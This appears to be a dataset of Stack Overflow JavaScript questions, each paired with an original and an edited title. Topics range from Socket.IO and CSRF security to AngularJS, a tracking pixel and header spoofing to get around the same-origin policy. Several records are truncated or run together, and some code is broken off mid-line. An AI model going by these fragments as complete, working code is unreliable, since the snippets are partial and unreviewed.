How to meassure javascript parse time," In our company we combine every Javascript file into one big (around 700kb but growing) minified and gzipped Javascript file. I am trying to assess the performance differences between using one big Javascript file for every page (minified and gzipped) and using several Javascript files, one for each page.An obvious difference is that the big Javascript file can be cached by browsers after it has been loaded on the first page request and creates little overhead thereafter while when using several js files, there will be at least one uncached get request on each different page. So I would be trading a slower first initial page load for slower successive initial page loads.In order to find out when the slow initial page load (using one big Javascript file) will become problematic enough to justify the work of breaking up the combined file into smaller files and changing our build procedure, I would like to find out how long it takes for the code to be parsed, so I can estimate the total loading and parsing time.So far my approach has been to add a script tag to a test page which takes the current time, appending a bigish script with Javascript and after that meassuring time again like so: At the end of 700kbCombineFile.js, I appended: Then I subtract the network transfer time obtained from firebug and receive approximately 700ms for a 700 kb file and about 300ms for a 300 kb file.Does this approach make sense? Why not? Is there a better way/any tools for doing this? <code>  var head = document.getElementsByTagName('head')[0];var script = document.createElement('script')script.setAttribute('type', 'text/javascript');script.src = 'path/700kbCombineFile.js';start_time = new Date().getTime();head.appendChild(script); console.log(new Date().getTime() - start_time)",How to measure javascript parse time

How the heck do I secure Socket.IO?," I've been working with Socket.IO for a few days and it's been both extremely exciting and even more frustrating.

How do I secure it?What's stopping a malicious user from copying (or editing) my code and connecting to my server? I can grab the username from my PHP script and submit it to Socket.IO so I can recognize them as that user (and the PHP has security of course), but what's stopping someone from just submitting an unregistered username?How can I make sure that the events submitted are authentic and haven't been tampered with?My basic socket.io chat for references.Server: Client: It all works dandy, except for having absolutely no security. <code>  var io = require('socket.io').listen(8080);var connectCounter = 0;io.sockets.on('connection', function (socket) {connectCounter++; console.log('People online: ', connectCounter);socket.on('set username', function(username) {socket.set('username', username, function() {console.log('Connect', username); });});socket.on('emit_msg', function (msg) { // Get the variable 'username'socket.get('username', function (err, username) { console.log('Chat message by', username); io.sockets.volatile.emit( 'broadcast_msg' , username + ': ' + msg ); }); });socket.on('disconnect', function() { connectCounter--; });}); <?php session_start() ?><!DOCTYPE html><html lang=""en""><head> <meta charset=""utf-8"" /> <title>untitled</title></head><body><input id='message' type='text'><div id=""content""></div><script src=""http://localhost:8080/socket.io/socket.io.js""></script><script src=""http://code.jquery.com/jquery-latest.js""></script><script> var socket = io.connect('http://localhost:8080');$.ajax({type: 'GET', url: 'https://mysite.com/execs/login.php?login_check=true', dataType: 'json', success: function(data) {var username = data.username;socket.emit('set username', username, function (data){});}}); socket.on('broadcast_msg', function (data) { console.log('Get broadcasted msg:', data); var msg = '<li>' + data + '</li>'; $('#content').append(msg); });$('#message').keydown(function(e) {if(e.keyCode == 13) {e.stopPropagation(); var txt = $(this).val(); $(this).val(''); socket.emit('emit_msg', txt, function (data){ console.log('Emit Broadcast msg', data); });}});</script></body></html>",How do I secure Socket.IO?

Typical Angular.js workflow and project structure (with Python Flask)," I am pretty new to this whole MV* client-side framework frenzy. It doesn't have to be AngularJS, but I picked it because it feels more natural to me than either Knockout, Ember or Backbone. Anyway what is the workflow like? Do people start with developing a client-side application in AngularJS and then hooking up the back-end to it?Or the other way around by first building the back-end in Django, Flask, Rails and then attaching an AngularJS app to it? Is there a ""right"" way of doing it, or is it just a personal preference in the end?I am also not sure whether to structure my project according to the Flask or AngularJS? community practices.For example, Flask's minitwit app is structured like so: AngularJS tutorial app is structured like this: I could picture a Flask app by itself, and it's fairly easy to see AngularJS app like ToDo List by itself but when it comes to using both of these technologies I don't understand how they work together. It almost seems like I don't need a server-side web-framework when you already have AngularJS, a simple Python web server will suffice. In the AngularJS to-do app for example they use MongoLab to talk to the database using Restful API. There was no need having a web framework on the back-end.Maybe I am just awfully confused, and AngularJS is nothing more than a fancy jQuery library so I should use just like I would use jQuery in my Flask projects (assuming I change the AngularJS template syntax to something that doesn't conflict with Jinja2). I hope my questions make some sense. I mainly work on the back-end and this client-side framework is an unknown territory for me. <code>  minitwit|-- minitwit.py|-- static |-- css, js, images, etc...`-- templates |-- html files and base layout angular-phonecat|-- app `-- css `-- img `-- js `-- lib `-- partials `-- index.html|-- scripts `-- node.js server and test server files",Typical AngularJS workflow and project structure (with Python Flask)

overlapping key events javascript," I am working on a little HTML/JavaScript/CSS3 project for fun. I'm basically trying to make a wheel that rolls around in the browser window. To control the wheel I'm using keyup and keydown events for the cursor keys (left and right turn the wheel and up and down roll it forward or backward).I've got it working pretty well so far, but there are two major glitches. Say I want to roll the wheel forward and without stopping I want to turn it a little to the right, then I would keep the up key pressed and press the right cursor key. When I do this there's a pause in the movement before it registers both events and keeps rolling.That's one of the problems, the main problem is that, once I've performed the previous action and then wheel is at a desirable angle, if I let go of the right cursor key the browser registers both keys as released and the wheel comes to a stand still. Here is a jsFiddle of what it looks like: http://jsfiddle.net/UKqwu/1/. I know the code is a mess but it's a work in progress/learning experience and I've only been programming for a month or so.Anyways thanks for any help. It only works in Chrome at the moment as far is I know. Haven't really been bothered fixing compatibility issues at this stage. <code> ",Overlapping key events

Who is faster PEG or GLR," I'm trying to create some kind of lint tool for the C/AL programming language. So basically I need to perform syntax and lexical analysis against the source code. I've planned to write parser from the scratch, but then discovered that there are a lots of tools helping generate these parsers automatically.I need performance, since checking 20 megabytes of code in one piece is the normal scenario, and I need that tool to be extendable by custom rules. So I decided to go with JavaScript.As far I have found two generators I can use Jison and PEG.js. Which of them give me more parsing performance? Maybe not comparing libraries, but algorithms?Which one is better for my needs (parsing general purpose programming language)?UPDATE:I have found similar Q&As:Packrat parsing vs. LALR parsingPerformance of parsers: PEG vs LALR(1) or LL(k) <code> ",Who is faster: PEG or GLR?
Javascript Security: is storing sensitive data in a self invoking function insecure?," I know security is either non-existant or very difficult in client side JavaScript. I know my server-side code should ultimately decide who it gives data to or accepts data from.That said, is the following okay to do. By ""okay"" I mean if this were the method used on some new popular trendy cool web app. Could I sleep at night knowing that I won't see ""Super Cool Web App Hacked, change your passwords!"" all over HN and Reddit (or any other sources of info people care about) as a result of this implementation.If it is not secure. Why? How can that info (username and password) be obtained?If it is secure? How sure are you? Why is it secure? What is stopping me from getting that info outside of my obvious inability to right now.Partial answers are welcome. Just looking for a better understanding.EDITI'm thinking about the case of some trying to steal a users credentials. My understanding is that cookies are insecure because 1.) other javascripts (via XSS or whatever) can access them and because 2.) they are passed in the clear. I figure SSL would take care of the second issue and lets just assume I'm able to prevent XSS. It would now seem that cookies are now secure, right?I'm aware of some supposed browser vulnerabilities that assist in making cookies insecure. That's what made me ask this question. Given all the things that make cookies insecure, is this (code below) any better?http://jsfiddle.net/KTastrophy/vXEjm/1/ OR see code below(Only tested in Chrome) <code>  <!DOCTYPE html><html> <head> </head>",Javascript Security: is storing sensitive data in a self invoking function more secure than cookies?

jQuery click() still being triggered after class is removed," I've got a click event assigned to a div of a particular class. When the click occurs, the class is removed from the div.

Expand and collpase with angular js," I am trying to figure out a way to do an expand and collapse using angular js. I haven't been able to find an elegant way to do this without manipulating dom objects in the controller (which is not the angular way). Currently I have a nice way to do it for a one layer expand and collapse. However when I start nesting, things get complicated and don't work the way I want it to (expanding and collapsing multiple areas when they shouldn't be). The problem comes in by me not knowing how to send a unique identifier with an ng-click to only expand/collapse the right content. I should mention that these items are in an ng-repeat so I can necessarily customize parameters being sent.I was able to use this jsfiddle to help me get a one layer expand and collapse to work. However this is a toggle way to do it and I want the user to be able to keep things expanded while expanding others. So what I did to fix this was use an array of and every time something is clicked the index of that clicked item would be added to the array and the class expanded. When the user clicked again the index was removed from the array and the area was collapsed.Another way I found that you can do it is by using directives. But I can't really find any exampled to wrap my head around how directives work. I am not sure how to even start when it comes to writing directives.My current set up is this: The issue with this setup is that if I have to parent divs expanded and those both have something under them to expand, clicking the expand text will expand them in both areas as they are not unique. <code>  function Dexspander($scope) { $scope.ExpandArray = []; //Push or pop necessary elements for tracking $scope.DespopulatArray = function (identifier, element) { if (_.indexOf($scope.ExpandArray, identifier + element) != -1) { $scope.ExpandArray.splice(_.indexOf($scope.ExpandArray, identifier + element), 1); } else { $scope.ExpandArray.push(identifier + element); } } //Change class of necessary elements $scope.Dexspand = function (identifier, element) { if (_.indexOf($scope.ExpandArray, identifier + element) != -1) { return ""expand""; } else { return ""collapse""; } }}<div class=""user-header"" ng-repeat=""user in users""> <h1 ng-click=""DespopulatArray('user', $index)"">Expand</h1></div><div class=""user-content"" ng:class=""Dexspand('user', $index)""> <div class=""content""> <div class=""user-information""> <div class=""info-header""> <h1 ng-click=""DespopulatArray('info', $index)>Some Information</h1> </div> <div class=""info-contents"" ng:class=""Dexspand('info', $index)""> stuff stuff stuff stuff... </div> </div> </div></div>",Expand and collapse with angular js

"iOS Webapp - Preventing 'body bounces', but keeping for an element"," I've been working on a mobile webapp as of late. I'm optimizing mobile-first, focusing specifically on iOS for the iPhone right now. I don't want the precise look of a native app, but I think that the feeling of being native is of absolute importance. I've made the markup and CSS to reflect this idea, leaving me with this (annotated to better understand the problem I'm having later on):This all works problem-free, and it also has the advantage of having a native feel, with static header and footer, and a scrollable inner view (thanks to -webkit-overflow-scrolling: touch).As anyone who has used iOS for more than 5 minutes will know, when you scroll up or down, you get some nice momentum scrolling. Also, when you hit the top of a list, you get a nice 'bounce' effect:I feel that this helps to define the feeling of iOS, and such a small detail can go a long way. Luckily, when you are below the top of a list in a scrollable element in a webapp, and scroll past the top, you get the same effect. This is the desired behavior in action:However, when you are at the top of the list, and try to recreate the same bouncing behavior a the top of the list ( la Setting.app, seen above), we get the following behavior, which is not desired:I've seen some similar questions on Stack Overflow, but these all opt for disabling bouncing. I'm wondering if it's at all possible to keep bouncing, but always make it occur on body section section#main, not on webapp's chrome. I'm not using jQuery, so I'd prefer answers to be in straight-up JavaScript (bonus points for a CSS solution, though).Here's a GitHub repo with all of the code (Sinatra, HAML, and Sass; current branch is so), or a JSFiddle with broken images and links, but shows the issue in question on an iPhone (best to add to homescreen to test). <code> ","Prevent scroll bounce for the body element, but keep it for child elements in iOS"

How to build & deploy a Samsung SmartTV app without the IDE," Problem:I'd like to try building a proof-of-concept app using the Samsung SmartTV SDK 2.5 (I have a 2011 model TV - UA55D8000). Unfortunaltely, the SDK comes in two varieties that only seem to work on Microsoft Windows. It's weird because there's no reason it should be the case: the televisions themselves run Linux and applications are written in JavaScript.This presents two problems:As I don't have Microsoft Windows at home, I can't use the build environment (nor the TV emulator) that come with the SDK. (The SDK files themselves are just JavaScript)Even if I had access to Windows, it's very hard to automate building & testing of the Apps without access to traditional build tools (e.g: Make, Ant, Autotools, etc)How can I build Samsung Smart TV Applications on Linux? (i.e: without using the Windows-based build tools that come with the SDK)What I've figured out so far:From what I can gather, a JavaScript-mode application is simply zip file containing an XML config file, one or more JavaScript files (including supplied JavaScript interface libraries for platform SDK functions), and any required assets (HTML, images, etc).Also, from what I gather, deployment involves placing the zip file and an XML manifest file on a web-server network accessible to the TV, logging in as 'develop' on the TV and 'syncing' the application to the installed applications on the TV.Could someone point me to a source for the full deployment requirements & app bundle requirements? Or even just a working sample? <code> ",How to build & deploy a Samsung SmartTV app without the IDE (e.g: on Linux)

Does anyone know how to do this? Obviously I can't seem to test this in this condition. ThanksI modified the answer below (Thanks so much) to come up with this function.

Poor js/jQuery performance - particularly in IE9," I'm having serious visual & performance issues with the script below. The biggest problem is that the animation of the object is becoming really jerky, almost cripplingly so in IE9, but increasingly annoying in Firefox. It has been pretty fast until recently - but I'm concerned the complexity is slowing things down. Oddly the Sunspider benchmark runs faster in my IE9 instance, than in Firefox.The script (which is a snippet of a larger collection ***):Checks a HTML5 session storage log of the users progression throughthe game. Depending on the stage, animates an object between twopoints using crSpline. Ensures the browser window follows the objectacross a large canvas, via scrollLeft etc. Finally, it loads a popup window via colorbox. When this box is closed, the user progression log is incremented accordingly and the object moves again.Are there aby obvious speed improvments I could make to my code? There's a fair bit of repition, how can I reduce that? Are there any infinite loops running that I'm missing? Is there software I can use to profile slow points of the JS?*** (I can't provide the other JS files or HTML, but I have identified this script as the problem)UPDATE:After a fair bit more testing, it appears that the step animate function - which follows the object in the window via scrollLeft - is causing the jerky animation. Removing it improves things considerably.This isn't a viable long term solution however. A quick fix is to call the follow function on complete, but this is a much less smooth experience for the end user, especially when the object moves longer distances.So, how would I modify the step function to run a lot 'slower'/more efficiently? I'm guessing the jerkiness is caused by it using all the available resources to follow the object every millisecond. <code>  (function ($) { sessionStorage.gameMainStage = 0 moveShip = function() { switch (sessionStorage.gameMainStage){ case '1': $(""#object"").animate( { crSpline: $.crSpline.buildSequence([[715, 425], [582, 524], [556, 646], [722, 688], [963, 629], [1143, 467]]) },{ duration: 10000, step: function() { var mover = $('#object'), posX = mover.position().left;

How can I correctly and guaranteed capture and re-fire the form submit event?," This is probably not your usual ""How do I capture form submit events?"" question.I'm trying to understand precisely how form submit events are handled by jQuery, vanilla Javascript, and the browser (IE/FF/Chrome/Safari/Opera) -- and the relationships between them. (See my other question.) After hours of Googling and experimenting, I still cannot come to a conclusion, either because of discord or vagueness.I'm finishing up a script which integrates with website forms so that the forms can't be submitted until an AJAX request comes back.Ideally:User fills out formForm is submitted -- but no previously-bound event handlers are called, except mineMy handler makes an API request (asynchronously, of course)User confirms validation results from API responseForm submit continues normally, automatically, invoking the other handlers which before were suppressedMy current understanding is that: (these may be wrong, please correct me if so)jQuery binds form submit event handlers to the submit button click eventsEvent handlers directly on the submit element click events (whether in the markup like onclick="""" or bound using jQuery) are executed firstEvent handlers on the form submit events (whether in the markup like onsubmit="""" or bound using jQuery) are executed nextCalling $('[type=submit]').click() doesn't invoke the form's submit event, so its handlers don't get calledCalling $('form').submit() doesn't invoke the submit button's click event, so its handlers don't get calledYet somehow, a user that clicks the submit button ends up invoking handlers bound to the form's submit event... (but as mentioned above, invoking click on the submit button doesn't do the same)In fact, any way the user submits the form (via submit button or hitting Enter), handlers bound with jQuery to the form submit event are called...Right now, I am:Unbinding handlers bound with jQuery to the submit button's click event while preserving a reference to themBinding my own handler to the submit button's click event, so it executes firstTaking any handlers bound in the markup using onclick="""" and onsubmit="""" (on their respective elements) and re-binding them using jQuery (so they execute after mine), then setting the attributes to nullRe-binding their handlers (from step 1) so they execute lastActually, this has been remarkably effective in my own testing, so that my event handler fires first (essential).The problem, and my questions:My handler fires first, just as expected (so far). The problem is that my handler is asynchronous, so I have to suppress (preventDefault/stopPropagation/etc) the form submit or submit button click event which invoked it... until the API request is done. Then, when the API request comes back, and everything is A-OK, I need to re-invoke the form submit automatically. But because of my observations above, how do I make sure all the event handlers are fired as if it were a natural form submit?What is the cleanest way to grab all their event handlers, put mine first, then re-invoke the form submit so that everything is called in its proper order?And what's the difference, if any, between $('form').submit() and $('form')[0].submit()? (And the same for $('[type=submit]').click() and $('[type=submit]')[0].click())tl;dr, What is the canonical, clear, one-size-fits-all documentation about Javascript/jQuery/browser form-submit-event-handling? (I'm not looking for book recommendations.)Some explanation: I'm trying to compensate for a lot of the Javascript in shopping cart checkout pages, where sometimes the form is submitted only when the user CLICKS the BUTTON (not a submit button) at the bottom of the page, or there are other tricky scenarios. So far, it's been fairly successful, it's just re-invoking the submit that's really the problem. <code> ","How can I correctly capture and re-fire the form submit event, guaranteed?"

With this JSON as an example: I can't find any useful examples that include nested JSON, even here in the StackOverflow.what's the most efficient way to loop through and assign each element to a table cell? The HTML output is not important - I know how to make a table... How do I get the ""stars""?When I use the Chrome console and simply $.getJSON('/example'); I get the entire JSON returned in the responseText, starting with ""{""date"":""2012-10-18 ,""data"": [{""title"": ""The Princess Bride"", However in neither the JSON docs, the JQuery docs on $.getJSON, nor in any JavaScript examples can I find a reference to responseText. So, I'm lost. What argument does $.getJSON need to objectify the responseText? <code>  $.each(foo, function(bar){}); { date: "" 2012-10-18 16:58:35.104576"", data: [{ title: ""The Princess Bride"", rating: ""PG"", length: 128, stars: [ ""Gary Elwes"", ""Robin Wright"", ""Christopher Guest"" ] }, { title: ""This is Spinal Tap"", rating: ""R"", length: 105, stars: [ ""Christopher Guest"", ""Michael McKean"", ""Harry Shearer"" ] }]}",reading nested JSON via AJAX with jquery or javascript and outputting to tables
Best way to develop a tracking pixel," I am trying to build a pixel that would track the current URL the user is on when they visit. I can use either JS (preferred) or a 1x1 image pixel. With JS I am assuming that I'd need to run an AJAX request to a PHP script to capture the info that I need and with an image pixel I am having issues getting the currently URL. I also thought about URL encoding the current URL with JS and dynamically placing the image pixel with the encoded current URL as a query string to a PHP script, but that I can get to be very long. If I am to go the AJAX route, which AJAX library can I use? JQuery is too bloated for this purpose. Any other ideas? <code> ",Developing a tracking pixel
Two way communication with server side objects with javascript," BackgroundMy background is high scale object oriented middleware and Applications development for embedded devices and desktops with C++. Now we need to create a high scale web-app for our startup. Question Request-response based and continuous polling based current web-development frameworks looks very primitive, inefficient. I am looking for completely server-side object oriented and event based programming. Here is an example it,There is a persistent object named employeeManager on server, methods of this object, events of this object Now, client side javascript should be able to call the methods of this (server-side) object and should be able to receive events of this object. We can have results of the method call in asynchronous mode. Framework should also provide a way so that view ( or html-js page ) can register for required server side events.Is there any frameworks which works on this methodology. Anything like this on top of socketIO? Any framework which provides a good two way RPC between client javascript and sever side objects? <code>  empList getAllEmployeeList(); empList getEmployeeOfDepartment(string strDept); /*Some more */ employeeAdded(empID); employeeEdited(empID); employeeRemoved(empID); /*Some more */",Two way communication with server side objects for web-application development

How to split an array into two arrays and keep sum of sub-values of array as equal as possible," I really need an master of algorithm here! So the thing is I got for example an array like this: and I want to split it up, so that it looks like this: so now, why do I want it too look like this?Because I want to keep the sum of sub values as equal as possible. So 970 is about 870 + 110 and 78 is about 23 + 50.So in this case it's very easy because if you would just split them and only look at the first sub-value it will already be correct but I want to check both and keep them as equal as possible, so that it'll also work with an array which got 100 sub-arrays! So if anyone can tell me the algorithm with which I can program this it would be really great!Scales:~1000 elements (sublists) in the arrayElements are integers up to 10^9I am looking for a ""close enough solution"" - it does not have to be the exact optimal solution. <code>  [ [870, 23] [970, 78] [110, 50]] // first array[ [970, 78]]// second array[ [870, 23] [110, 50]]",How to split an array into two subsets and keep sum of sub-values of array as equal as possible

Are the advantages of Typed Arrays in JavaScript that they work the same or similar in C?," I've been playing around with Typed Arrays in JavaScript. I imagine normal arrays ([1, 257, true]) in JavaScript have poor performance because their values could be of any type, therefore, reaching an offset in memory is not trivial.I originally thought that JavaScript array subscripts worked the same as objects (as they have many similarities), and were hash map based, requiring a hash based lookup. But I haven't found much credible information to confirm this.So, I'd assume the reason why Typed Arrays perform so well is because they work like normal arrays in C, where they're always typed. Given the initial code example above, and wishing to get the 10th value in the typed array... The type is Int32, so each value must consist of 32 bits or 4 bytes.The subscript is 10.So the location in memory of that value is <array offset> + (4 * 10), and then read 4 bytes to get the total value.I basically just want to confirm my assumptions. Is my thoughts around this correct, and if not, please elaborate. I checked out the V8 source to see if I could answer it myself, but my C is rusty and I'm not too familiar with C++. <code>  var buffer = new ArrayBuffer(16);var int32View = new Int32Array(buffer); var value = int32View[10];",Are the advantages of Typed Arrays in JavaScript is that they work the same or similar in C?

django javascript loading fails irregularly," I am developing a Django project on localhost with some included JavaScript files in a base.html template.

Is there an php echo/print equivalent in javascript," Say I want to print html from inside a script tag.A source like this should look something like this in browser after the script has run I could write my own code for this purpose but since this looks to me like a very simple problem, I'm guessing either I've missed something or my thinking is flawed in some way and printing is left out intentionally.Also, somewhat related: I'd like to know if a script is (or can be made) aware of the script tags surrounding it. With this information it would be much easier to find the position for the printed html code to be injected into, assuming it's not highly discouraged.To clarify: I don't need you to write a print function for me. I only need to know if a native method to achieve this exists and I've missed it or alternatively the reason it shouldn't be done.EDITI realized that I didn't think the question through.I got my facts straight and now almost everything seems to be working. I should've originally mentioned that the print function was needed inside templates - I'm working on a template engine experiment. I managed to work it out by separating scripts from plain html and concatenating the split html sans scripts with script output.As I was writing the code I noticed that everything wouldn't go so smooth because of the asynchronous nature of js. I guess I was expecting to be able to do any kind of js magic in templates, just like I could in php. Seems like actually supporting async code in a fool-proof manner inside templates will require some more thought. <code>  <div>foo</div><script>print('<div>Print this after the script tag</div>');</script><div>bar</div> <div>foo</div><script>print('<div>Print this after the script tag</div>');</script><div>Print this after the script tag</div><div>bar</div>",Is there a php echo/print equivalent in javascript

Including files from Github into HTML pages," PAY ATTENTION! You can't include Github scripts directly from Github after this change. We added the X-Content-Type-Options: nosniff header to our raw URL responses way back in 2011 as a first step in combating hotlinking. This has the effect of forcing the browser to treat content in accordance with the Content-Type header. That means that when we set Content-Type: text/plain for raw views of files, the browser will refuse to treat that file as JavaScript or CSS. But there are alternatives. Check my answer to this question.I am trying to include a JavaScript file from GitHub into a local HTML file for testing (like an image found on the internet: <img src=""http://..."">).

How does similar_text work," I just found the similar_text function and was playing around with it, but the percentage output always suprises me. See the examples below. I tried to find information on the algorithm used as mentioned on php: similar_text()Docs: Can anybody explain how this actually works?Update:Thanks to the comments I found that the percentage is actually calculated using the number of similar charactors * 200 / length1 + lenght 2 So that explains why the percenatges are higher then expected. With a string with 5 out of 95 it turns out 10, so that I can use. But I still cant figure out why PHP returns a different result on turning the strings around. The JS code provided by dfsq doesn't do this. Looking at the source code in PHP I can only find a difference in the following line, but i'm not a c programmer. Some insight in what the difference is, would be appreciated.In JS: In PHP: (php_similar_str function) Source: Source in Javascript: similar text port to javascript <code>  <?php$p = 0;similar_text('aaaaaaaaaa', 'aaaaa', $p);echo $p .

JavaScript SPA-Frameworks (Single Page Application)," My goal is to migrate an existing web application to a RESTful single page application (SPA).Currently, I'm evaluating several Javascript web application frameworks. My requirements are as follow:RESTful data layer (like ember-data)MV*-structureDynamic routesTesting-supportCoding by conventionSEO-supportBrowser-History-SupportGood (API-) documentationProduction-readyLiving communityBackboneThe current application is using backbone.js. Overall, backbone.js is a nice project, but I'm missing well-defined structures that determine where what has to happen and how things must get implemented. Working in a bigger team with changing developers this leads to some kind of unstructured code, difficult to maintain and difficult to understand. This is why I'm searching now for a framework, that already defines all this stuff.EmberI looked into ember.js the last days. The approach seems very promising to me. But, unfortunately, the code changes almost daily. So, I won't call it production-ready. And, unfortunately, we can't wait for it to be version 1.0. But I really like the idea behind this framework.AngularAngular.js is a widely spread framework as well, maintained by Google. But I could not get familiar with angular. For me, the structure seems kind of unclear, explanations are missing of the overall responsibilities of each part of the framework, and the implementations feel circuitous.Just to get this straight: this is just my personal impression and might be based on missing knowledge.Batman and MeteorAs I understood, both frameworks need a server part as well. And since we just want a RESTful backend - no matter what language, technic or software, this is not what we want. Further, the backend API does already exist (RoR).Knockout, CanJS and SpineI did not go any deeper into these three candidates. Maybe this will be my next step.So my questions now:Am I missing any good SPA-frameworks?What framework would you suggest/recommend?Would you avoid any of the mentioned frameworks?What is your experience in bigger SP applications?PS: I'd would like to recommend a great blogpost from Steven Anderson (core developer from Knockout.js) about the ""Throne of JS""-conference (from 2012) and javascript frameworks in general.PS: Yes, I know there are already some question on SO.

Javascript instanceof operator fails when passing an object through windows," In order to pass data between windows, I open new windows via the window.open method and set a property of the newly opened window to an object. This allows me not only to pass data, but to share the instance of the variable, meaning if I modify the object, or any of its derived properties, on one window, it modifies it on all windows.The problem, however, is something is going very funny with the instanceof operator.When I do The first line returns ""object"" while the second one returns false.I specifically need the instanceof operator to check between arrays and objects.Here is a fiddle of an example (WARNING: tries to open a window on page load, so a popup blocker might block it). http://jsfiddle.net/Chakra/mxf2P/1/ <code>  typeof mm instanceof Object",instanceof operator fails when passing an object through windows

Detecting device touch support in JavaScript," In the past, when detecting whether a device supports touch events in JavaScript, we could do something like this: However, Google Chrome (17.x.x+) returns true for the above check, even if the underlying device does not support touch events. For example, running the above code on Windows 7 returns true, and thus if we combine it with something like: On Google Chrome, the event is never fired since we're binding to ontouchstart. In short, does anyone know a reliable way to circumvent this? I am currently running the following check: Which is far from ideal... <code>  var touch_capable = ('ontouchstart' in document.documentElement); var start_evt = (touch_capable) ? 'ontouchstart' : 'onmousedown'; var touch_capable = ('ontouchstart' in document.documentElement && navigator.userAgent.toLowerCase().indexOf('chrome') == -1)",How can I detect device touch support in JavaScript?

It can be a new blank tab, a local HTML page or any existing website.I've tried JSONP, it works great but I would like to use the default XMLHttpRequest even if Twitter servers do not support CORS http://en.wikipedia.org/wiki/Cross-Origin_Resource_Sharing.On google.com homepage for example, I create a simple AJAX call to Twitter API that I execute with Firebug: This will not work and print an error on Firebug due to the same origin policy: It returns an HTTP 200 OK code but no JSON data has been received from the server.I've seen two differences between a request from a google.com webpage and the api.twitter webpage (who works for Twitter API requests since it's the API domain name, same origin).An Origin HTTP header has been added with the current domain name: The Referer HTTP header is not https://api.twitter.com/ like a request from api.twitter.com page but is in my case: That's why I've tried to remove the Origin HTTP header and modify the current Referer HTTP header to https://api.twitter.com/I've done this with the Firefox ModifyHeaders extension and it works, I can check in Firebug ""Net"" tab that those changes were made correctly.Now, I have the SAME request header from a request coming from google.com webpage and api.twitter.com webpage.It will still fail to do an AJAX request from another domain than the API, even if the HTTP headers are overwritten, why?By the way, do you know why an AJAX request to Twitter API from Firefox ""New Tab"" will work? <code>  var xhr = new XMLHttpRequest();xhr.open(""GET"", ""https://api.twitter.com/1/friends/ids.json?screen_name=baptx"", false);xhr.send(); Error: Failurexhr.send(); Origin https://www.google.com Referer https://www.google.com/webhp?hl=en",Using XMLHttpRequest without CORS by modifying HTTP headers?

JavaScript - Does a function expression have its own scope/lexical environment," I'm reading the Execution Context / Lexical Environment section of the ECMA 262 5 specification. It states the following: (emphasis added) A Lexical Environment is a specification type used to define the association of Identifiers to specific variables and functions based upon the lexical nesting structure of ECMAScript code. A Lexical Environment consists of an Environment Record and a possibly null reference to an outer Lexical Environment. Usually a Lexical Environment is associated with some specific syntactic structure of ECMAScript code such as a FunctionDeclaration, a WithStatement, or a Catch clause of a TryStatement and a new Lexical Environment is created each time such code is evaluated.I noticed that it says nothing about creating a lexical environment for Function Expressions. Is a lexical environment created for function expressions, or is one created only for function declarations? Am I missing something?Edit: I notice that function code will have its own execution context, which is why I'm also confused why function expression is not mentioned in the lexical environment section. <code> ",Does a function expression have its own scope/lexical environment

"Angular against Asp.Net WebApi, implement CSRF on the server."," I'm implementing a website in Angular.js, which is hitting an ASP.NET WebAPI backend.Angular.js has some in-built features to help with anti-csrf protection. On each http request, it will look for a cookie called ""XSRF-TOKEN"" and submit it as a header called ""X-XSRF-TOKEN"" .This relies on the webserver being able to set the XSRF-TOKEN cookie after authenticating the user, and then checking the X-XSRF-TOKEN header for incoming requests.The Angular documentation states: To take advantage of this, your server needs to set a token in a JavaScript readable session cookie called XSRF-TOKEN on first HTTP GET request. On subsequent non-GET requests the server can verify that the cookie matches X-XSRF-TOKEN HTTP header, and therefore be sure that only JavaScript running on your domain could have read the token. The token must be unique for each user and must be verifiable by the server (to prevent the JavaScript making up its own tokens). We recommend that the token is a digest of your site's authentication cookie with salt for added security.I couldn't find any good examples of this for ASP.NET WebAPI, so I've rolled my own with help from various sources. My question is - can anyone see anything wrong with the code?First I defined a simple helper class: Then I have the following method in my authorisation controller, and I call it after I call FormsAuthentication.SetAuthCookie(): Then I have a custom attribute which I can add to controllers to make them check the csrf header: Lastly, I clear the Csrf token when the user logs out: Can anyone spot any obvious (or not-so-obvious) problems with that approach? <code>  public class CsrfTokenHelper{ const string ConstantSalt = ""<ARandomString>""; public string GenerateCsrfTokenFromAuthToken(string authToken) { return GenerateCookieFriendlyHash(authToken); } public bool DoesCsrfTokenMatchAuthToken(string csrfToken, string authToken) { return csrfToken == GenerateCookieFriendlyHash(authToken); } private static string GenerateCookieFriendlyHash(string authToken) { using (var sha = SHA256.Create()) { var computedHash = sha.ComputeHash(Encoding.Unicode.GetBytes(authToken + ConstantSalt)); var cookieFriendlyHash = HttpServerUtility.UrlTokenEncode(computedHash); return cookieFriendlyHash; } }} // http://www.asp.net/web-api/overview/security/preventing-cross-site-request-forgery-(csrf)-attacks // http://docs.angularjs.org/api/ng.$http private void SetCsrfCookie() { var authCookie = HttpContext.Current.Response.Cookies.Get("".ASPXAUTH""); Debug.Assert(authCookie != null, ""authCookie != null""); var csrfToken = new CsrfTokenHelper().GenerateCsrfTokenFromAuthToken(authCookie.Value); var csrfCookie = new HttpCookie(""XSRF-TOKEN"", csrfToken) {HttpOnly = false}; HttpContext.Current.Response.Cookies.Add(csrfCookie); } public class CheckCsrfHeaderAttribute : AuthorizeAttribute{ // http://stackoverflow.com/questions/11725988/problems-implementing-validatingantiforgerytoken-attribute-for-web-api-with-mvc protected override bool IsAuthorized(HttpActionContext context) { // get auth token from cookie var authCookie = HttpContext.Current.Request.Cookies["".ASPXAUTH""]; if (authCookie == null) return false; var authToken = authCookie.Value; // get csrf token from header var csrfToken = context.Request.Headers.GetValues(""X-XSRF-TOKEN"").FirstOrDefault(); if (String.IsNullOrEmpty(csrfToken)) return false; // Verify that csrf token was generated from auth token // Since the csrf token should have gone out as a cookie, only our site should have been able to get it (via javascript) and return it in a header. // This proves that our site made the request. return new CsrfTokenHelper().DoesCsrfTokenMatchAuthToken(csrfToken, authToken); }} HttpContext.Current.Response.Cookies.Remove(""XSRF-TOKEN"");","Angular against Asp.Net WebApi, implement CSRF on the server"

The question is related to this question.When the user clicks on a form submit button the value / label of the submit button should change to ""loading.."", status of the button will be set to disabled AND the submit event should be triggered in the normal way, leading to a submit call to the server. This way the user would see the following effect:Immediately: The submit button value changes to ""loading.."" and gets disabledAs soon as the server responds: user gets presented the result of the server request (whereas server responds are handled without angular intervention)I created this plunk to show what I mean. My issue relates to this line: elm.attr('disabled',true); . This does not only disable the button, but also prevent to propagate the submit event. Thus I get a disabled button (desired result), but the form does not get submitted (undesired result).You can see the changing behavior if you comment / uncomment this line : elm.attr('disabled',true);Any idea how to change this? <code> ",prevent multiple form submissions using angular.js - disable form button
